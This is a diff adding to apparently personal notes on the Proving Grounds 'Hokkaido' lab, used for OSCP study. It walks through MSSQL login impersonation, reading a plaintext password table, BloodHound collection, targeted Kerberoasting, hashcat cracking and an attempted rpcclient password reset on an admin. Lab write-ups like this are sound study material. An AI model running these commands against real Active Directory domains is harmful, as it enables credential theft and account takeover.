@@ -419,7 +419,103 @@ Alright. I'm stuck.
 
 https://medium.com/@sakyb7/proving-grounds-hokkaido-tjnull-oscp-prep-ca34df1e6491
 
-Okay. So apparently we need to 
+Okay. So apparently we need to kerberoast, after stealing more credentials from the database.
+
+```sh
+impacket-mssqlclient  'hokkaido-aerospace.com/discovery':'Start123!'@192.168.55.40 -dc-ip 192.168.55.40 -windows-auth
+```
+
+And run SQL:
+
+```sql
+SELECT name FROM master..sysdatabases;
+
+-- hrappdb seems interesting.
+
+use hrappdb;
+-- no perms
+
+SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+
+-- apparently we need to impersonate `hrappdb-reader`...
+
+EXECUTE AS LOGIN = 'hrappdb-reader';
+use hrappdb;
+-- success.
+
+
+SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;
+-- hmmm, 'sysauth' table...
+
+select * from sysauth;
+-- id   name               password           
+-- --   ----------------   ----------------   
+--  0   b'hrapp-service'   b'Untimed$Runny'   
+
+-- great, we stole another password.
+
+```
+
+Now to see what attack paths we can get with BloodHound.
+
+```sh
+# get data for bloodhound
+bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.55.40
+
+# then, load it into bloodhound
+# (new terminal)
+bloodhound-setup
+bloodhound-start
+
+# I had to do some fiddling to get BloodHound to work...
+sudo runuser -u postgres -- psql -c 'ALTER DATABASE postgres REFRESH COLLATION VERSION; ALTER DATABASE template1 REFRESH COLLATION VERSION;'
+
+sudo -u postgres psql
+ALTER DATABASE bloodhound REFRESH COLLATION VERSION;
+bloodhound-setup
+
+# end of fiddling.
+```
+
+
+![](Pasted%20image%2020260605173510.png)
+
+It looks like `hrapp-service` has GenericWrite to `hazel.green`...
+
+Our guide says to kerberoast just `hazel.green`:
+
+```sh
+git clone https://github.com/ShutdownRepo/targetedKerberoast
+
+cd targetedKerberoast
+
+python targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.55.40
+```
+
+We steal 3 hashes, `maintenance`, `discovery`, and `Hazel.Green`.
+
+Let's crack Hazel's password!
+
+```sh
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+hashcat -m 13100 roast-hazel.txt /usr/share/wordlists/rockyou.txt --force --show
+
+# haze1988
+```
+
+Great, our cred is `Hazel.Green:haze1988`.
+
+![](Pasted%20image%2020260605174915.png)
+
+`Molly.Smith` is a Tier 1 admin.
+
+Let's change her password.
+
+```sh
+rpcclient -N 192.168.55.40 -U 'Hazel.Green' --password="haze1988"
+setuserinfo2 MOLLY.SMITH 23 'Password123!'
+# fails with result was NT_STATUS_ACCESS_DENIED
+```
 ## Root access
 
 
